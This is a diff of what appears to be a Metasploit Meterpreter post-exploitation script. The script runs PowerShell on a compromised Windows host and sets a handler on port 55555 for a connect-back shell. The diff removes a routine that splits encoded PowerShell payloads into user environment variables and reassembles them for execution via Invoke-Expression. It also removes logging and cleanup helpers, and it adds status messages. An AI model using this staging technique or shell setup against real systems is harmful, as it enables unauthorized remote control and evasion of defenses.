@@ -163,112 +163,6 @@ meter_type = client.platform
     return [cmd_out, running_pids, open_channels]
   end
 
-  #
-  # Powershell scripts that are longer than 8000 bytes are split into 8000
-  # 8000 byte chunks and stored as environment variables. A new powershell
-  # script is built that will reassemble the chunks and execute the script.
-  # Returns the reassembly script.
-  #
-  def stage_to_env(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))
-
-    # Check to ensure script is encoded and compressed
-    if compressed_script =~ /\s|\.|\;/
-      compressed_script = compress_script(compressed_script)
-    end
-    # Divide the encoded script into 8000 byte chunks and iterate
-    index = 0
-    count = 8000
-    while (index < compressed_script.size - 1)
-      # Define random, but serialized variable name
-      env_prefix = "%05d" % ((index + 8000)/8000)
-      env_variable = env_prefix + env_suffix
-
-      # Create chunk
-      chunk = compressed_script[index, count]
-
-      # Build the set commands
-      set_env_variable =  "[Environment]::SetEnvironmentVariable("
-      set_env_variable += "'#{env_variable}',"
-      set_env_variable += "'#{chunk}', 'User')"
-
-      # Compress and encode the set command
-      encoded_stager = compress_script(set_env_variable)
-
-      # Stage the payload
-      print_good(" - Bytes remaining: #{compressed_script.size - index}")
-      execute_script(encoded_stager)
-
-      # Increment index
-      index += count
-
-    end
-
-    # Build the script reassembler
-    reassemble_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
-    reassemble_command += "Select-String #{env_suffix}|Sort-Object|%{"
-    reassemble_command += "$c+=[Environment]::GetEnvironmentVariable($_,'User')"
-    reassemble_command += "};Invoke-Expression $($([Text.Encoding]::Unicode."
-    reassemble_command += "GetString($([Convert]::FromBase64String($c)))))"
-
-    # Compress and encode the reassemble command
-    encoded_script = compress_script(reassemble_command)
-
-    return encoded_script
-  end
-
-  #
-  # Log the results of the powershell script
-  #
-  def write_to_log(cmd_out, log_file, eof)
-    # Open log file for writing
-    fd = ::File.new(log_file, 'w+')
-
-    # Read output until eof and write to log
-    while (line = cmd_out.channel.read())
-      if (line.sub!(/#{eof}/, ''))
-        fd.write(line)
-        vprint_good("\t#{line}")
-        cmd_out.channel.close()
-        break
-      end
-      fd.write(line)
-      vprint_good("\t#{line}")
-    end
-
-    # Close log file
-    fd.close()
-
-    return
-  end
-
-  #
-  # Clean up powershell script including process and chunks stored in environment variables
-  #
-  def clean_up(script_file = nil, eof = '', running_pids =[], open_channels = [], env_suffix = Rex::Text.rand_text_alpha(8), delete = false)
-    # Remove environment variables
-    env_del_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
-    env_del_command += "Select-String #{env_suffix}|%{"
-    env_del_command += "[Environment]::SetEnvironmentVariable($_,$null,'User')}"
-    script = compress_script(env_del_command, eof)
-    cmd_out, running_pids, open_channels = *execute_script(script)
-    write_to_log(cmd_out, "/dev/null", eof)
-
-    # Kill running processes
-    running_pids.each() do |pid|
-      session.sys.process.kill(pid)
-    end
-
-
-    # Close open channels
-    open_channels.each() do |chan|
-      chan.channel.close()
-    end
-
-    ::File.delete(script_file) if (script_file and delete)
-
-    return
-  end
-
 
 ################## Main ##################
 @exec_opts.parse(args) { |opt, idx, val|
@@ -355,7 +249,10 @@ computer_name = session.sys.config.sysinfo['Computer']
 compressed_script = compress_script(script_in, eof)
 script = compressed_script
 cmd_out, running_pids, open_channels = execute_script(script, 15)
+print_status("The PID to kill once you have finished with PowerShell: " + running_pids[0].to_s)
+
 #print_status('Executing the script: ' + script_in)
+
 
 print_status("Starting PowerShell on host: " + computer_name)
 
@@ -365,8 +262,7 @@ rport = 55555
 
 set_handler(rhost,rport)
 print_status("If a shell is unsuccesful, ensure you have access to the target host and port. Maybe you need to add a route (route add ?)")
-
-
+print("\n")
 
 
 
